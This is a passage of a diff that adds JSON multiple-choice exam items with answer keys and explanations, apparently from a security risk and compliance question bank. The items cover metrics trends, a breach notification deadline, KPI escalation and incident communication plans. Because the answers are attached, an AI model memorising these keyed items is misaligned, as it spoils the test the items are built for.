+        "body": "This spreadsheet contains too many columns for a risk committee audience and should be simplified to just CVE and Severity",
+        "correct": false
+      }
+    ],
+    "explanation": "Missing Owner and Due Date on any open finding is a real accountability gap, and it's especially glaring here: two Critical findings have been open for close to three months with nobody assigned and no deadline — that's exactly the kind of thing a risk committee needs surfaced so they can push for ownership and a timeline. The CVE identifiers are actually formatted consistently in this excerpt — that's not a real issue. Discovery date is directly relevant to a risk committee, since it's what reveals how long a Critical finding has been sitting open, which is central to the actual problem here. And the fix for missing accountability data isn't to strip the sheet down further — that would remove even more useful context, not add the missing owner/due-date fields the committee actually needs."
+  },
+  {
+    "external_key": "RC-065",
+    "domain": "RC",
+    "subtopic": "Metrics",
+    "difficulty": 5,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A quarterly metrics dashboard shows the four trends below. Select the TWO trends that, TOGETHER, suggest a genuine maturity problem rather than a healthy, well-functioning program.\n\nTrend 1: Mean time to detect has decreased 40% over two quarters.\nTrend 2: Mean time to remediate has stayed flat despite MTTD improving.\nTrend 3: The percentage of findings closed as \"risk accepted\" without documented compensating controls has tripled.\nTrend 4: The number of unique subtopics covered in tabletop exercises has increased each quarter.",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Trend 2 — detection is getting faster but the team isn't converting that into faster fixes, meaning the earlier warning isn't translating into real risk reduction.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Trend 3 — a tripling of undocumented, uncompensated risk-acceptance closures suggests findings are being waved through rather than properly triaged.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Trend 1, since a decreasing MTTD in isolation is itself evidence of a maturity problem",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Trend 4, since a broadening tabletop exercise scope indicates the program is losing focus on its core areas",
+        "correct": false
+      }
+    ],
+    "explanation": "Trend 2 and Trend 3 together tell a real story: the team is getting better at spotting problems (Trend 1, genuinely positive) but not fixing them any faster (Trend 2, stagnant), and worse, an increasing share of findings are being closed via undocumented risk acceptance rather than actually addressed (Trend 3) — which looks a lot like a team using \"risk accepted\" as a pressure-release valve for a remediation backlog it can't keep up with, rather than genuine, deliberate risk management. Trend 1 alone (faster detection) is a positive indicator, not a problem — the concern only emerges when paired with stagnant remediation speed. Trend 4 (broader tabletop coverage) is a positive maturity signal on its own — expanding the range of scenarios practiced is generally a sign of a growing, not shrinking, program, not evidence of lost focus."
+  },
+  {
+    "external_key": "RC-066",
+    "domain": "RC",
+    "subtopic": "Regulatory Reporting",
+    "difficulty": 5,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A breach notification timeline is shown below. A regulator later questions whether the organization met its notification obligation. What is the most likely compliance concern?\n\nBreach confirmed internally: 2026-07-01\nExecutive briefing completed: 2026-07-18\nRegulatory notification sent: 2026-08-02\n(Applicable regulation requires notification \"without unreasonable delay, and in no case later than 30 days after discovery.\")",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Notification was sent 32 days after the breach was confirmed internally — outside the 30-day cap, and the slow executive briefing suggests the delay wasn't from a genuinely complex investigation.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "There is no compliance concern, since 30 days is a soft guideline rather than an enforceable deadline under most breach notification regulations",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "The concern is irrelevant since regulatory notification timelines only apply to breaches involving payment card data",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "The only relevant date for compliance purposes is when the executive briefing occurred, not when the breach was confirmed",
+        "correct": false
+      }
+    ],
+    "explanation": "\"Discovery\" for most breach notification regulations is generally tied to when the organization confirmed the breach, not when executives were briefed or when notification was actually sent — counting from July 1, the August 2 notification lands at 32 days, past the stated 30-day cap, and the language \"without unreasonable delay\" adds a second, independent bar this timeline also struggles to clear given the 17-day gap before executives were even looped in. Many breach notification laws (state and sector-specific) impose genuinely enforceable deadlines with real penalties for missing them — treating 30 days as merely a soft suggestion is a dangerous assumption. Regulatory notification obligations aren't limited to payment card data — many breach notification laws apply broadly to PII, health data, and other categories depending on jurisdiction and sector. And discovery date, not the internal briefing date, is what starts the regulatory clock in the first place — using the later executive-briefing date would understate how much time has actually elapsed."
+  },
+  {
+    "external_key": "RC-067",
+    "domain": "RC",
+    "subtopic": "Metrics",
+    "difficulty": 4,
+    "is_multi": false,
+    "select_n": 1,
+    "stem": "A dashboard KPI table is shown below. Which trend most clearly warrants immediate escalation to leadership, independent of the others?\n\nMTTD: 4.2 hrs (Q1) -> 3.8 hrs (Q2) -> 3.5 hrs (Q3)\nMTTR: 6.1 days (Q1) -> 5.9 days (Q2) -> 5.7 days (Q3)\nPhishing click rate: 11% (Q1) -> 9% (Q2) -> 8% (Q3)\nCritical findings open >90 days: 2 (Q1) -> 2 (Q2) -> 19 (Q3)",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Critical findings open >90 days jumping from 2 to 19 in a single quarter, while every other metric is trending steadily in a healthy direction — a sharp, isolated spike like this needs its own explanation.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "MTTD, since any positive trend still deserves the same escalation priority as a negative one for visibility purposes",
+        "correct": false
+      },
+      {
+        "label": "C",
+        "body": "Phishing click rate, since an 8% click rate is still considered an unacceptable failure regardless of the downward trend",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "MTTR, since a decrease of only 0.2-0.4 days per quarter is too slow to be meaningful and should be treated as a red flag",
+        "correct": false
+      }
+    ],
+    "explanation": "Every metric here is improving steadily except one, which jumped nearly 10x in a single quarter with no explanation visible in the numbers alone — that kind of sharp, isolated spike against an otherwise healthy trend line is exactly what should get pulled out and escalated for its own root-cause conversation (a policy change, a team change, a backlog, something specific happened). MTTD improving is good news, not something requiring the same urgency as a negative anomaly — \"positive trends deserve equal escalation\" misunderstands what escalation is for. An 8% phishing click rate, while not zero, is a continued improvement and isn't automatically \"unacceptable\" without a stated target to compare against — the trend itself is the encouraging signal here, not a hidden failure. And a steadily, if modestly, improving MTTR is a normal incremental trend, not a red flag — small consistent gains quarter over quarter are a reasonable trajectory, not evidence of a problem."
+  },
+  {
+    "external_key": "RC-068",
+    "domain": "RC",
+    "subtopic": "Stakeholder Communication",
+    "difficulty": 4,
+    "is_multi": true,
+    "select_n": 2,
+    "stem": "A stakeholder communication plan lists the rows below. Select the TWO rows that are missing a critical piece of information a real incident communication plan needs.\n\nRow 1: Executive leadership — notified by: IR lead — channel: phone call — timing: within 1 hour of declaration\nRow 2: Legal counsel — notified by: (blank) — channel: (blank) — timing: as needed\nRow 3: Affected customers — notified by: Comms team — channel: email — timing: per legal review\nRow 4: Regulatory bodies — notified by: Legal — channel: (blank) — timing: per applicable deadline",
+    "exhibit": null,
+    "choices": [
+      {
+        "label": "A",
+        "body": "Row 2 — no defined notifier, no channel, and \"as needed\" is too vague to actually trigger timely legal involvement during a live incident.",
+        "correct": true
+      },
+      {
+        "label": "B",
+        "body": "Row 4 — no defined channel means there's no confirmed method for actually reaching regulators when the deadline-driven timing requires it.",
+        "correct": true
+      },
+      {
+        "label": "C",
+        "body": "Row 1, since a phone call is rarely an appropriate channel for notifying executive leadership during an incident",
+        "correct": false
+      },
+      {
+        "label": "D",
+        "body": "Row 3, since email is rarely an appropriate channel for notifying affected customers of a breach",
+        "correct": false
+      }
+    ],
+    "explanation": "Row 2 is the most incomplete: no defined owner, no channel, and \"as needed\" gives no actual trigger — for a stakeholder whose involvement is often time-sensitive (privilege, regulatory strategy, notification review), that vagueness is a real gap. Row 4 has an owner and a timing driver (the applicable deadline) but no defined channel — without knowing how legal will actually reach regulators, the deadline-driven timing can't reliably be met. Row 1's phone call for executive leadership is actually a reasonable, fast channel for urgent internal notification — nothing about it is inappropriate. Row 3's email channel for customer notification, following legal review, is also a completely standard and appropriate approach — neither of these rows has the kind of gap Row 2 and Row 4 do."
   }
 ]
